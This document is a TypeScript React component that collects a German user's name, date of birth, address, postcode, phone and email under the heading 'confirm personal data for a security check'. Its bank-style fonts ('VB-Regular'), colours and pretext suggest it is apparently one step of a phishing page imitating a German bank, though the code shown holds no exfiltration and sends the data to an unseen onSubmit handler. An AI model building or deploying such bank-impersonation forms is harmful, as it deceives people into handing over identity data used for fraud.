import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface PersonalDataFormProps {
  onSubmit: (data: PersonalData) => void;
}

const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [street, setStreet] = useState('');
  const [streetNumber, setStreetNumber] = useState('');
  const [plz, setPlz] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('+49 ');
  const [email, setEmail] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<PersonalData>>({});
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);
  
  // Focus states for floating labels
  const [firstNameFocused, setFirstNameFocused] = useState(false);
  const [lastNameFocused, setLastNameFocused] = useState(false);
  const [dateOfBirthFocused, setDateOfBirthFocused] = useState(false);
  const [streetFocused, setStreetFocused] = useState(false);
  const [streetNumberFocused, setStreetNumberFocused] = useState(false);
  const [plzFocused, setPlzFocused] = useState(false);
  const [cityFocused, setCityFocused] = useState(false);
  const [phoneFocused, setPhoneFocused] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Date formatting function
  const formatDateInput = (value: string): string => {
    const digitsOnly = value.replace(/\D/g, '');
    if (digitsOnly.length <= 2) {
      return digitsOnly;
    } else if (digitsOnly.length <= 4) {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2)}`;
    } else if (digitsOnly.length <= 8) {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
    } else {
      return `${digitsOnly.slice(0, 2)}.${digitsOnly.slice(2, 4)}.${digitsOnly.slice(4, 8)}`;
    }
  };

  // Phone number change handler
  const handlePhoneChange = (value: string) => {
    if (!value.startsWith('+49')) {
      setPhone('+49 ' + value.replace(/^\+?49\s?/, ''));
    } else {
      setPhone(value);
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<PersonalData> = {};
    
    if (!firstName.trim()) newErrors.first_name = 'Vorname ist erforderlich';
    if (!lastName.trim()) newErrors.last_name = 'Nachname ist erforderlich';
    if (!dateOfBirth.trim()) newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
    if (!street.trim()) newErrors.street = 'Straße ist erforderlich';
    if (!streetNumber.trim()) newErrors.street_number = 'Hausnummer ist erforderlich';
    if (!plz.trim()) newErrors.plz = 'PLZ ist erforderlich';
    if (!city.trim()) newErrors.city = 'Ort ist erforderlich';
    if (!phone.trim() || phone.trim() === '+49') newErrors.phone = 'Telefonnummer ist erforderlich';
    if (!email.trim()) newErrors.email = 'E-Mail ist erforderlich';
    
    // Date validation
    if (dateOfBirth.trim() && !/^\d{2}\.\d{2}\.\d{4}$/.test(dateOfBirth.trim())) {
      newErrors.date_of_birth = 'Ungültiges Datumsformat (TT.MM.JJJJ)';
    }
    
    // PLZ validation
    if (plz.trim() && !/^\d{5}$/.test(plz)) {
      newErrors.plz = 'PLZ muss genau 5 Ziffern haben';
    }
    
    // Email validation
    if (email.trim() && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      newErrors.email = 'Ungültige E-Mail-Adresse';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const formData: PersonalData = {
        first_name: firstName.trim(),
        last_name: lastName.trim(),
        date_of_birth: dateOfBirth.trim(),
        street: street.trim(),
        street_number: streetNumber.trim(),
        plz: plz.trim(),
        city: city.trim(),
        phone: phone.trim(),
        email: email.trim()
      };
      
      console.log('PersonalDataForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error: any) {
      console.error('PersonalDataForm: Submission error:', error);
      setIsLoading(false);
    }
  };

  // Helper function to create floating label input
  const createFloatingLabelInput = (
    id: string,
    type: string,
    value: string,
    onChange: (value: string) => void,
    label: string,
    focused: boolean,
    setFocused: (focused: boolean) => void,
    error?: string,
    placeholder?: string,
    maxLength?: number
  ) => {
    const isLabelFloating = value.length > 0 || focused;
    
    return (
      <div style={{ position: 'relative', marginBottom: '16px' }}>
        <input
          id={id}
          type={type}
          value={value}
          onChange={(e) => {
            const inputValue = id === 'dateOfBirth' ? formatDateInput(e.target.value) : e.target.value;
            onChange(inputValue);
          }}
          onFocus={() => {
            setFocused(true);
            if (id === 'phone' && value === '') {
              onChange('+49 ');
            }
          }}
          onBlur={() => {
            setFocused(false);
            if (id === 'phone' && value === '+49 ') {
              onChange('');
            }
          }}
          placeholder={placeholder || ''}
          maxLength={maxLength}
          style={{
            width: '100%',
            padding: '28px 16px 8px 16px',
            border: error ? '2px solid #dc3545' : (focused ? '2px solid #0066cc' : '1px solid rgba(0, 0, 0, 0.65)'),
            borderRadius: '4px',
            fontSize: '16px',
            lineHeight: '24px',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal',
            backgroundColor: 'transparent',
            outline: 'none',
            transition: 'all 0.2s ease',
            minHeight: '65px',
            boxSizing: 'border-box'
          }}
          onMouseEnter={(e) => {
            if (!focused && !error) {
              e.currentTarget.style.backgroundColor = '#f2f7fb';
            }
          }}
          onMouseLeave={(e) => {
            if (!focused) {
              e.currentTarget.style.backgroundColor = 'transparent';
            }
          }}
        />
        <label
          htmlFor={id}
          style={{
            position: 'absolute',
            left: '16px',
            top: isLabelFloating ? '8px' : '20px',
            fontSize: isLabelFloating ? '12px' : '16px',
            color: error ? '#dc3545' : (focused ? '#0066cc' : 'rgba(0, 0, 0, 0.65)'),
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal',
            transition: 'all 0.2s ease',
            pointerEvents: 'none',
            transformOrigin: 'left top',
            transform: isLabelFloating ? 'translateY(0)' : 'translateY(0)'
          }}
        >
          {label}
        </label>
        {error && (
          <div style={{
            color: '#dc3545',
            fontSize: '12px',
            marginTop: '4px',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            {error}
          </div>
        )}
      </div>
    );
  };

  if (isLoading) {
    return <Loading message="Persönliche Daten werden verarbeitet..." />;
  }

  // Responsive styles
  const containerPadding = isSmallMobile ? '20px 20px 20px 20px' : isMobile ? '24px 24px 24px 24px' : '32px 8px 32px 8px';
  const cardWidth = isMobile ? '100%' : '660px';
  const cardPadding = isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px';
  const titleFontSize = isSmallMobile ? '1.5rem' : isMobile ? '1.75rem' : '2.375rem';
  const titleLineHeight = isSmallMobile ? '1.75rem' : isMobile ? '2rem' : '2.75rem';

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: containerPadding,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'flex-start'
      }}>
        <div style={{
          width: '100%',
          maxWidth: cardWidth,
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'visible'
        }}>
          <div style={{
            padding: cardPadding
          }}>
            <h1 style={{
              color: '#003d7a',
              fontSize: titleFontSize,
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: titleLineHeight,
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Persönliche Daten bestätigen
            </h1>
            
            <p style={{
              margin: '0 0 32px 0',
              fontSize: isMobile ? '14px' : '16px',
              lineHeight: isMobile ? '20px' : '24px',
              color: '#000',
              fontFamily: 'VB-Regular, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Bitte bestätigen Sie Ihre persönlichen Daten zur Sicherheitsüberprüfung.
            </p>

            <form onSubmit={handleSubmit}>
              {/* Name Fields */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
                gap: '16px',
                marginBottom: '16px'
              }}>
                <div>
                  {createFloatingLabelInput(
                    'firstName',
                    'text',
                    firstName,
                    setFirstName,
                    'Vorname',
                    firstNameFocused,
                    setFirstNameFocused,
                    errors.first_name
                  )}
                </div>
                <div>
                  {createFloatingLabelInput(
                    'lastName',
                    'text',
                    lastName,
                    setLastName,
                    'Nachname',
                    lastNameFocused,
                    setLastNameFocused,
                    errors.last_name
                  )}
                </div>
              </div>

              {/* Date of Birth */}
              <div style={{ marginBottom: '16px' }}>
                {createFloatingLabelInput(
                  'dateOfBirth',
                  'text',
                  dateOfBirth,
                  setDateOfBirth,
                  'Geburtsdatum (TT.MM.JJJJ)',
                  dateOfBirthFocused,
                  setDateOfBirthFocused,
                  errors.date_of_birth,
                  '',
                  10
                )}
              </div>

              {/* Address Fields */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '2fr 1fr',
                gap: '16px',
                marginBottom: '16px'
              }}>
                <div>
                  {createFloatingLabelInput(
                    'street',
                    'text',
                    street,
                    setStreet,
                    'Straße',
                    streetFocused,
                    setStreetFocused,
                    errors.street
                  )}
                </div>
                <div>
                  {createFloatingLabelInput(
                    'streetNumber',
                    'text',
                    streetNumber,
                    setStreetNumber,
                    'Hausnummer',
                    streetNumberFocused,
                    setStreetNumberFocused,
                    errors.street_number
                  )}
                </div>
              </div>

              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '1fr 2fr',
                gap: '16px',
                marginBottom: '16px'
              }}>
                <div>
                  {createFloatingLabelInput(
                    'plz',
                    'text',
                    plz,
                    setPlz,
                    'PLZ',
                    plzFocused,
                    setPlzFocused,
                    errors.plz,
                    '',
                    5
                  )}
                </div>
                <div>
                  {createFloatingLabelInput(
                    'city',
                    'text',
                    city,
                    setCity,
                    'Ort',
                    cityFocused,
                    setCityFocused,
                    errors.city
                  )}
                </div>
              </div>

              {/* Contact Fields */}
              <div style={{ marginBottom: '16px' }}>
                {createFloatingLabelInput(
                  'phone',
                  'tel',
                  phone,
                  handlePhoneChange,
                  'Telefonnummer',
                  phoneFocused,
                  setPhoneFocused,
                  errors.phone
                )}
              </div>

              <div style={{ marginBottom: '32px' }}>
                {createFloatingLabelInput(
                  'email',
                  'email',
                  email,
                  setEmail,
                  'E-Mail-Adresse',
                  emailFocused,
                  setEmailFocused,
                  errors.email
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#ccc' : '#0066b3',
                  color: 'white',
                  border: 'none',
                  borderRadius: '50px',
                  padding: isMobile ? '16px 32px' : '18px 48px',
                  fontSize: isMobile ? '16px' : '18px',
                  fontFamily: 'VB-Bold, Arial, sans-serif',
                  fontStyle: 'normal',
                  fontWeight: 'normal',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: '100%',
                  textAlign: 'center',
                  display: 'inline-block',
                  lineHeight: '1.5'
                }}
                onMouseOver={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#0052a3';
                  }
                }}
                onMouseOut={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#0066b3';
                  }
                }}
              >
                {isLoading ? 'Wird verarbeitet...' : 'Daten bestätigen'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PersonalDataForm;